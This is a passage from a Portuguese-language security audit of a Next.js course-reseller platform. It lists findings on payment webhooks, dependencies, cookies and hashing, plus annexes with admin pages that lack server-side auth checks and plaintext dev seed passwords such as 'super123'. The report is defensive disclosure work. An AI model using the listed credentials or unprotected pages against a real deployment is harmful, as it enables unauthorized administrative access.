**Arquivo(s):** `src/app/api/webhooks/mercadopago/route.ts:66-67`, `src/app/api/webhooks/asaas/route.ts:57-58`, `src/app/api/notifications/route.ts:29`

**Descrição:** `payload: body as never` evita o tipo. Prisma JSON aceita `any`, mas o `as never` mascara potencial problema (Prisma valida null pero não shape). 5 ocorrências.

**Correção sugerida:** Usar `payload: body as Prisma.InputJsonValue` ou tipo apropriado. Mesmo para headers.

**Esforço estimado:** S.

---

### [P2-030] Plataforma parceira: erros 500 são absorvidos no `fulfillEnrollment` — pode deixar aluno órfão
**Categoria:** Confiabilidade
**Arquivo(s):** `src/lib/enrollment/fulfill.ts:163+` (não inspecionado completamente), `src/lib/asaas/process.ts:425+`

**Descrição:** Se a plataforma parceira retornar 500 quando criamos o aluno (`POST usuarios/novo`), o webhook MP/Asaas marca `markLog(logId, false, ...)` e termina. Mas o `Payment` já pode ter sido criado (em `fulfill` antes da chamada da plataforma). Resultado: aluno pagou, banco mostra pago, mas plataforma não tem cadastro — atendimento manual obrigatório.

**Correção sugerida:** Reorganizar `fulfillEnrollment` para executar a chamada na plataforma ANTES de gravar Payment+atualizar Enrollment. Se falhar, retry idempotente em retry queue (talvez `webhook_logs.processed = false` + cron de retry).

**Esforço estimado:** M.

---

### [P2-031] Image config `next.config.ts` permite `images.pexels.com` — atacante upload SVG via stock?
**Categoria:** Hardening
**Arquivo(s):** `next.config.ts:4-11`

**Descrição:** `images.pexels.com` está no allowlist de remotePatterns. Não auditei o uso, mas se algum lugar usa URL de Pexels para capa de curso, o atacante poderia hostear uma imagem maliciosa no Pexels (improvável) ou simular o domínio em DNS interno. Risco baixo, mas dirty.

**Correção sugerida:** Reduzir o allowlist para apenas domínios estritamente necessários: `*.supabase.co`, `playcurso.com`. Imagens de bibliotecas (Unsplash/Pexels) só se realmente usadas na home.

**Esforço estimado:** S.

---

### [P2-032] `mercadopago` SDK 2.12.0 traz `uuid <11.1.1` (CVE)
**Categoria:** Dependência / CVE
**Arquivo(s):** `package.json:29`

**Descrição:** `mercadopago` 2.12.0 depende de `uuid <11.1.1` (GHSA-w5hq-g745-h8pq — buffer bounds em v3/v5/v6). Sem fix sem breaking. O projeto não usa o SDK do MP (usa fetch direto em `src/lib/mercadopago/client.ts`), mas o SDK é instalado.

**Correção sugerida:** Remover `mercadopago` do `dependencies` (não usado). Reduz superfície.

**Esforço estimado:** S.

---

### [P3-033] postcss <8.5.10 (CVE XSS em </style>)
**Categoria:** Dependência / CVE
**Arquivo(s):** transitiva do next

**Descrição:** Vem por dentro do Next. Resolvido com upgrade Next 16.2.6 (P0-007).

**Esforço estimado:** S (junto com Next).

---

### [P3-034] `qs` 6.11.1-6.15.1 ReDoS — transitiva
**Categoria:** Dependência / CVE
**Arquivo(s):** transitiva

**Descrição:** ReDoS via stringify. Sem uso direto.

**Esforço estimado:** S (audit fix).

---

### [P3-035] Seed expõe credenciais fortes-ish em texto puro
**Categoria:** Hardening
**Arquivo(s):** `prisma/seed.ts:17-20`

**Descrição:** Senhas dev: super123, vendas123, gerente123, teste123. Aceitável em dev/staging, mas se o seed for rodado por acidente em prod, dá acesso de SUPER_ADMIN com senha trivial. CLAUDE.md menciona credenciais em `docs/qa/PERFIS.md`.

**Correção sugerida:** Gate o seed por flag `NODE_ENV !== "production"` + variável `ALLOW_SEED=1`. Em prod, falhar fast.

**Esforço estimado:** S.

---

### [P3-036] Cookies pmb_admin_backup e pmb_impersonation com maxAge 8h fixo
**Categoria:** Hardening
**Arquivo(s):** `src/app/api/admin/revendedores/[id]/impersonate/route.ts:66-69`

**Descrição:** A janela de 8h para impersonação pode ser longa. Se o admin esquecer um window aberto em ambiente compartilhado, atacante usa por 8h. Não há refresh ou heartbeat.

**Correção sugerida:** Reduzir para 2h. Adicionar heartbeat (ping a cada X minutos para renovar).

**Esforço estimado:** S.

---

### [P3-037] Falta robots.txt — admin/painel indexáveis
**Categoria:** SEO / Discovery
**Arquivo(s):** `public/` (sem robots.txt)

**Descrição:** Não há `public/robots.txt`. Crawlers podem indexar `/admin`, `/painel`, `/login`. Risco baixo (páginas protegidas por auth) mas expõe a superfície na busca do Google.

**Correção sugerida:** Adicionar `public/robots.txt`:
```
User-agent: *
Disallow: /admin
Disallow: /painel
Disallow: /aluno
Disallow: /api
Disallow: /loja/suspended
```

**Esforço estimado:** S.

---

### [P3-038] Bcrypt rounds inconsistentes (10 vs 12)
**Categoria:** Qualidade
**Arquivo(s):** `src/lib/students/generate-password.ts:32` (10), `src/app/api/admin/revendedores/route.ts:218` (10), `src/app/api/auth/alterar-senha-inicial/route.ts:42` (10) vs `src/app/api/revendedores/cadastro/route.ts:100` (12), `src/app/api/auth/reset-password/route.ts:43` (12), `src/app/api/aluno/senha/route.ts:58` (12), `src/app/api/admin/me/password/route.ts:61` (12), `src/app/api/painel/config/password/route.ts:61` (12).

**Descrição:** Hashes variam entre 10 e 12 rounds. Não é um bug, mas inconsistência sugere falta de centralização.

**Correção sugerida:** Centralizar em `src/lib/auth/hash.ts` exportando `hashPassword(pwd)` com rounds fixo (12). Substituir todos os usos.

**Esforço estimado:** S.

---

## Notas adicionais (não viraram findings)

- TypeScript strict + `noEmit` está ativado; `tsc --noEmit` passa limpo (build verde como apontado).
- Não foram encontrados `as any`, `@ts-ignore`, ou `@ts-nocheck` — qualidade tipográfica boa.
- A lógica de tenant resolution no proxy é generally sólida — só a falha de propagação de headers em `NextResponse.next()` no caminho "app host" é problemática.
- Schema Prisma tem índices adequados para a maioria dos casos (faltam alguns compostos como notado).
- AES-256-GCM em `src/lib/crypto.ts` está corretamente implementado (IV aleatório de 12 bytes, auth tag, formato iv:cipher:tag).
- Webhook MP tem proteção contra reprocessamento via `Payment.mpPaymentId UNIQUE` constraint + check explícito em `processMpWebhook:124-131`.
- Webhook Asaas tem upsert por `asaasPaymentId UNIQUE` — idempotente.
- Plataforma parceira API integrada via form-data corretamente; client tem retry 3x com backoff exponencial.

---

## Anexo A: páginas /painel sem auth check server-side

```
src/app/painel/alunos/page.tsx
src/app/painel/cursos/page.tsx
src/app/painel/cupons/page.tsx
src/app/painel/dominio/page.tsx
src/app/painel/financeiro/page.tsx
src/app/painel/notificacoes/page.tsx
src/app/painel/onboarding/page.tsx
src/app/painel/vitrine/page.tsx
src/app/painel/configuracoes/page.tsx
src/app/painel/indicacoes/sacar/page.tsx
src/app/painel/certificados/emitidos/page.tsx
src/app/painel/certificados/emitir/page.tsx
```

## Anexo B: comandos executados e saídas relevantes

```
$ npm audit --production
20 vulnerabilities (3 low, 14 moderate, 3 high)
  - next 16.2.3: 13 CVEs (proxy bypass, RSC cache poisoning, XSS, SSRF, DoS)
  - xlsx *: prototype pollution + ReDoS (no fix)
  - nodemailer <=8.0.4: SMTP injection (no fix)
  - fast-uri <=3.1.1: path traversal HIGH
  - mercadopago, svix, resend: uuid CVE
  - ip-address: XSS
  - hono: 6 CVEs

$ grep -rn "ratelimit|Ratelimit" src --include="*.ts" --include="*.tsx"
(nenhum resultado — @upstash/ratelimit instalado mas não usado)

$ grep -rn "Content-Security|X-Frame|HSTS|Referrer-Policy" src/ next.config.ts
(nenhum resultado — sem security headers)

$ grep -rn "console\." src --include="*.ts" --include="*.tsx" | wc -l
81

$ grep -rn "dangerouslySetInnerHTML" src --include="*.tsx" --include="*.ts"
src/app/(main)/seja-revendedor/page.tsx:42 — JSON.stringify(faqSchema) (seguro, schema.org)

$ npx tsc --noEmit
(sem erros)

$ find src/app/api -name "route.ts" | wc -l
140

$ find src -name "*.ts" -o -name "*.tsx" | wc -l
545
```

## Anexo C: priorização para D-0 (lançamento)

**MUST FIX antes do go-live (P0):**
- 001, 002, 003, 004, 005, 006, 007, 008 — todos no checklist obrigatório.

**SHOULD FIX no D-0 ou D+1 (P1):**
- 009 (rate limit em login/forgot/leads/checkout), 010 (trustHost), 011 (errors leak), 012 (revogar tokens), 013 (magic link para aluno), 014 (CSV inj), 015 (painel layout auth), 016 (crons), 017 (HMAC antes de log), 018 (auth em /api/loja/confirmacao).

**NICE TO HAVE D+7 (P2-P3):**
- Restante.
